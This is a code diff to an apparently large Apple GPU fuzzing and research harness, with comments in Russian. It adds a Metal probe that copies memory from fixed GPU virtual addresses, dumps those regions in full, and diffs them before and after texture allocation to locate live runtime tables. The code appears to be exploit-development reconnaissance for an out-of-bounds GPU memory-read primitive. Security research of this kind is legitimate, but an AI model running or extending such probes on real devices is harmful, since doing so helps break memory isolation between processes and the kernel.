@@ -44709,6 +44709,9 @@ static void p_bq91(void) {
 // bq92_probe: одна проба свежими буферами. mode: 0=read (src→target),
 // 1=write (dest→target), 2=plain (без патча). Копия 0x1000. Возвращает
 // cb status (или <0); out41/outnz — счётчики в B; readback — контент B.
+// g_probe_fill_a — паттерн bA для read/plain (default 0x77; меняется для
+// уникальной трассировки self-upload, §246).
+static uint8_t g_probe_fill_a = 0x77;
 static long bq92_probe(id<MTLCommandQueue> mq, id<MTLDevice> dev, int mode,
                         uint64_t target, uint8_t *readback, size_t rbsz,
                         long *out41, long *outnz) {
@@ -44716,7 +44719,7 @@ static long bq92_probe(id<MTLCommandQueue> mq, id<MTLDevice> dev, int mode,
     id<MTLBuffer> bB = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
     if (!bA || !bB) return -1;
     uint64_t ga = [bA gpuAddress], gb = [bB gpuAddress];
-    memset([bA contents], (mode == 1) ? 0x41 : 0x77, 0x1000);
+    memset([bA contents], (mode == 1) ? 0x41 : g_probe_fill_a, 0x1000);
     memset([bB contents], 0, 0x1000);
     id<MTLCommandBuffer> cb = [mq commandBuffer];
     id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
@@ -45122,6 +45125,117 @@ static void p_bq94(void) {
         fsync(fileno(stderr));
     }
     LOG("[bq94] ИТОГ: изменённых чанков %ld из %d — это ЖИВЫЕ runtime-регионы (кандидаты)", nchanged, nv);
+    fsync(fileno(stderr));
+}
+
+// p_bq95 — v255: дампы плотных VRAM-регионов (0x100_00000000/0x20000) +
+// ТЕКСТУРНЫЙ churn-diff. Текстуры (private=VRAM-backed) трогают другие
+// таблицы, чем буферы (§246: буферный churn ничего не менял). Уникальные
+// probe-паттерны (0x50+i) — отслеживание self-upload (§246).
+static void p_bq95(void) {
+    LOG("[bq95] v255: плотные регионы + текстурный churn (§246-next)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq95] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq95] no queue"); return; }
+    long k41 = 0, knz = 0;
+    if (bq92_probe(mq, dev, 2, 0, NULL, 0, &k41, &knz) < 0 || !knz) {
+        LOG("[bq95] K0 CONTROL FAILED");
+        return;
+    }
+    LOG("[bq95] K0 OK");
+    fsync(fileno(stderr));
+
+    // Таргеты: плотные (0x0/0x20000) полным дампом + окрестности + разрежённые
+    static const uint64_t vas[] = {
+        0x10000000000ULL, 0x10000008000ULL, 0x1000000c000ULL, 0x10000010000ULL,
+        0x10000014000ULL, 0x10000018000ULL, 0x1000001c000ULL, 0x10000020000ULL,
+        0x10000024000ULL, 0x1000002c000ULL, 0x10000034000ULL, 0x1000003c000ULL,
+        0x10000040000ULL, 0x10000044000ULL, 0x10000080000ULL, 0x10000084000ULL,
+        0x100000a0000ULL, 0x100000a4000ULL, 0x100000e0000ULL, 0x100000e4000ULL,
+    };
+    int nv = (int)(sizeof(vas) / sizeof(vas[0]));
+    uint8_t *snapA = must_map((size_t)nv * 0x1000);
+    uint8_t *snapB = must_map((size_t)nv * 0x1000);
+
+    // === Проход 1 (уникальные паттерны 0x50+i) ===
+    for (int i = 0; i < nv; i++) {
+        g_probe_fill_a = (uint8_t)(0x50 + i);
+        long cnz = 0, c41 = 0;
+        memset(snapA + (long)i * 0x1000, 0, 0x1000);
+        bq92_probe(mq, dev, 0, vas[i], snapA + (long)i * 0x1000, 0x1000, &c41, &cnz);
+        long np = 0;
+        uint64_t mn = ~0ULL, mx = 0;
+        for (int q = 0; q < 0x200; q++) {
+            uint64_t v = *(uint64_t *)(snapA + (long)i * 0x1000 + q * 8);
+            if (v) { np++; if (v < mn) mn = v; if (v > mx) mx = v; }
+        }
+        LOG("[bq95] P1 %#llx: nz-u64 %ld/512 range [%#llx..%#llx]",
+            vas[i], np, np ? mn : 0, np ? mx : 0);
+        if (vas[i] == 0x10000000000ULL || vas[i] == 0x10000020000ULL) {
+            LOG("[bq95] === ПОЛНЫЙ ДАМП %#llx ===", vas[i]);
+            for (int r = 0; r < 64; r++)
+                LOG("[bq95] dense%llx+%04x: %016llx %016llx %016llx %016llx %016llx %016llx %016llx %016llx",
+                    vas[i] & 0xfffff, r * 0x40,
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 0),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 8),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 16),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 24),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 32),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 40),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 48),
+                    *(uint64_t *)(snapA + (long)i * 0x1000 + r*0x40 + 56));
+        }
+        fsync(fileno(stderr));
+    }
+
+    // === Текстурный churn: private(VRAM) + shared текстуры, alloc/release ===
+    LOG("[bq95] texture churn: 2×10 (private 256×256 rgba8 + shared 128×128)");
+    for (int it = 0; it < 10; it++) {
+        @autoreleasepool {
+            MTLTextureDescriptor *td1 = [MTLTextureDescriptor
+                texture2DDescriptorWithPixelFormat:MTLPixelFormatRGBA8Unorm
+                width:256 height:256 mipmapped:NO];
+            td1.storageMode = MTLStorageModePrivate;
+            id<MTLTexture> t1 = [dev newTextureWithDescriptor:td1];
+            MTLTextureDescriptor *td2 = [MTLTextureDescriptor
+                texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
+                width:128 height:128 mipmapped:NO];
+            td2.storageMode = MTLStorageModeShared;
+            id<MTLTexture> t2 = [dev newTextureWithDescriptor:td2];
+            (void)t1; (void)t2;
+        }
+        usleep(50000);
+    }
+    LOG("[bq95] texture churn завершён");
+    fsync(fileno(stderr));
+
+    // === Проход 2 (паттерны 0x70+i) + diff ===
+    long nchanged = 0;
+    for (int i = 0; i < nv; i++) {
+        g_probe_fill_a = (uint8_t)(0x70 + i);
+        long cnz = 0, c41 = 0;
+        memset(snapB + (long)i * 0x1000, 0, 0x1000);
+        bq92_probe(mq, dev, 0, vas[i], snapB + (long)i * 0x1000, 0x1000, &c41, &cnz);
+        long nd = 0, first = -1;
+        for (int q = 0; q < 0x200; q++) {
+            uint64_t a = *(uint64_t *)(snapA + (long)i * 0x1000 + q * 8);
+            uint64_t b = *(uint64_t *)(snapB + (long)i * 0x1000 + q * 8);
+            if (a != b) { nd++; if (first < 0) first = q; }
+        }
+        if (nd) {
+            nchanged++;
+            LOG("[bq95] *** DIFF %#llx: %ld/512 u64, первый @+%#lx",
+                vas[i], nd, first * 8);
+            long base = first * 8 - 0x20;
+            if (base < 0) base = 0;
+            hexdump("[bq95]   diff-A", snapA + (long)i * 0x1000 + base, 0x60);
+            hexdump("[bq95]   diff-B", snapB + (long)i * 0x1000 + base, 0x60);
+        }
+        fsync(fileno(stderr));
+    }
+    LOG("[bq95] ИТОГ: изменённых %ld из %d — текстурный churn", nchanged, nv);
     fsync(fileno(stderr));
 }
 
@@ -53733,6 +53847,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ92")) { p_bq92(); LOG("[probe13] bq92-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ93")) { p_bq93(); LOG("[probe13] bq93-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ94")) { p_bq94(); LOG("[probe13] bq94-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ95")) { p_bq95(); LOG("[probe13] bq95-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
